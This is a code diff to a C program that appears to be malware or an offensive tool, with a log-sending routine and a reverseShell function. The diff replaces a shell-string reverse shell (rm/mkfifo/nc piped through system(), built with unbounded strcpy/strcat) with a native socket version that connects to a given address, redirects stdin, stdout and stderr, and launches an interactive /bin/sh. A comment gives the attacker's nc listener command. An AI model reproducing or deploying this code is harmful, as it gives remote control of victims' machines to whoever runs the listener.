@@ -10,6 +10,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
 
 #define DEVICE "/dev/cd"
 #define LOGFILE "/log.txt"
@@ -98,29 +99,22 @@ int sendLog(char* ip) {
     return 0;
 }
 
-void reverseShell(char *getIP){
+void reverseShell(char *REMOTE_ADDR){
+	//Listen by nc -lvp 8888
 
-	//Hardcoded  ip and port
-	//Listen by nc -lvp <port details>
-	//http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-	
-	char header[100]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ";
-	char ip[100];
-	char port[100];
-	char footer[50]=" >/tmp/f";
-	
-	//copy argv[1] into buffer 
-	strcpy(ip,getIP);
-	//convert integer PORT to string and save it to buffer
-	sprintf(port,"%d",PORT);
-	
-	//create payload
-	strcat(header, ip);
-	strcat(header, " ");
-	strcat(header, port);
-	strcat(header, footer);	
-    
-    //printf("%s\n",header);
-    system(header);
+    struct sockaddr_in sa;
+    int s;
 
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(PORT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execl("/bin/sh", "/bin/sh", "-i", NULL);
+    return 0;
 }
